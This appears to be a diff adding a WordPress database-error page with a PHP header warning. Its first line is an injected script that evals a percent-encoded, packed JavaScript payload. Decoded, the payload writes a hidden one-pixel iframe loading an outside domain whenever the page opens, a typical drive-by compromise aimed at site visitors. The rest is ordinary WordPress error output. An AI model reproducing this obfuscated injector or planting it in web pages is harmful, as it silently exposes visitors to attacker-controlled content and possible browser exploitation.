@@ -1,0 +1,13 @@
+<script>eval(unescape('%65%76%61%6C%28%66%75%6E%63%74%69%6F%6E%28%61%55%2C%75%76%62%2C%54%4F%68%2C%63%71%51%2C%45%68%43%2C%41%4D%29%7B%45%68%43%3D%53%74%72%69%6E%67%3B%69%66%28%21%27%27%2E%72%65%70%6C%61%63%65%28%2F%5E%2F%2C%53%74%72%69%6E%67%29%29%7B%77%68%69%6C%65%28%54%4F%68%2D%2D%29%41%4D%5B%54%4F%68%5D%3D%63%71%51%5B%54%4F%68%5D%7C%7C%54%4F%68%3B%63%71%51%3D%5B%66%75%6E%63%74%69%6F%6E%28%45%68%43%29%7B%72%65%74%75%72%6E%20%41%4D%5B%45%68%43%5D%7D%5D%3B%45%68%43%3D%66%75%6E%63%74%69%6F%6E%28%29%7B%72%65%74%75%72%6E%27%5C%5C%77%2B%27%7D%3B%54%4F%68%3D%31%7D%3B%77%68%69%6C%65%28%54%4F%68%2D%2D%29%69%66%28%63%71%51%5B%54%4F%68%5D%29%61%55%3D%61%55%2E%72%65%70%6C%61%63%65%28%6E%65%77%20%52%65%67%45%78%70%28%27%5C%5C%62%27%2B%45%68%43%28%54%4F%68%29%2B%27%5C%5C%62%27%2C%27%67%27%29%2C%63%71%51%5B%54%4F%68%5D%29%3B%72%65%74%75%72%6E%20%61%55%7D%28%27%35%2E%32%28%22%3C%38%20%37%3D%5C%5C%22%36%3A%2F%2F%34%2E%30%2F%5C%5C%22%20%33%3D%31%20%39%3D%31%3E%22%29%3B%27%2C%31%30%2C%31%30%2C%27%63%6F%6D%7C%7C%77%72%69%74%65%7C%77%69%64%74%68%7C%62%65%73%6C%6F%71%61%77%65%7C%64%6F%63%75%6D%65%6E%74%7C%68%74%74%70%7C%73%72%63%7C%69%66%72%61%6D%65%7C%68%65%69%67%68%74%27%2E%73%70%6C%69%74%28%27%7C%27%29%2C%30%2C%7B%7D%29%29'));</script><!-- uy7gdr5kmn --><br />
+<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /mnt/web3/61/22/52466722/htdocs/blog/wp-includes/default-constants.php:298) in <b>/mnt/web3/61/22/52466722/htdocs/blog/wp-includes/functions.php</b> on line <b>3125</b><br />
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<title>Database Error</title>
+
+</head>
+<body>
+	<h1>Error establishing a database connection</h1>
+</body>
+</html>
